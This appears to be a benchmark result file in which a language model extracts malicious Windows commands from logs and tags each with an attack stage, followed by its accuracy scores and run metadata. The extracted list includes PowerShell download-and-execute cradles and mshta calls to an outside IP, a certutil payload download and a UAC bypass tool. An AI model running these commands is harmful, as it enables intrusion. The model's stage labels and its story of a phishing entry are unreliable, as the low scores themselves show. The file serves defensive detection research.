@@ -1,0 +1,159 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\tmp\tool.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"]",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "c:\tmp\tool.exe -update",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\5iftyvcm\\5iftyvcm.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \\\"%temp%\\uacme\\23 Akagi64.exe\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\ggoevpmw\\ggoevpmw.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe SAVE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run \\\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\aTxNMuea.reg\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powercfg.exe /change monitor-timeout-ac 300",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-AtomicTest T1119 \\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082/T1218.005.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\lrfwyakh\\lrfwyakh.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003 \\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powercfg.exe /change standby-state-time-ac 300",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-AtomicTest T1119 \\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082/T1218.005.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "calc.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg.exe DELETE \\\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v Debugger /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powercfg.exe /change disk-timeout-ac 300",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers executed multiple commands using PowerShell and other tools to achieve their goals. They began by gaining initial access to the machine through a phishing email or exploit kit. Once they gained access, they started executing scripts and tools to bypass security software, download additional malware, and gain persistence on the machine. The attackers also used various tools to collect information about the machine and the target network, indicating discovery phase activities. Additionally, some commands suggest attempts to escalate privileges and execute arbitrary code on the victim's machine. Overall, this indicates an ongoing cyberattack involving sophisticated tactics, techniques, and procedures.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 41369,
+      "completion_tokens": 1311,
+      "total_tokens": 42680,
+      "wall_clock_s": 24.943,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25925925925925924,
+      "recall": 0.17073170731707318,
+      "f1": 0.2058823529411765,
+      "tp": 7,
+      "fp": 20,
+      "fn": 34
+    },
+    "stage": {
+      "precision": 0.14814814814814814,
+      "recall": 0.1,
+      "f1": 0.11940298507462688,
+      "tp": 4,
+      "fp": 23,
+      "fn": 36,
+      "recall_partial": 0.05405405405405406
+    },
+    "hallucination_rate": 0.2777777777777778,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 41369,
+      "completion_tokens": 1311,
+      "total_tokens": 42680,
+      "wall_clock_s": 24.943,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
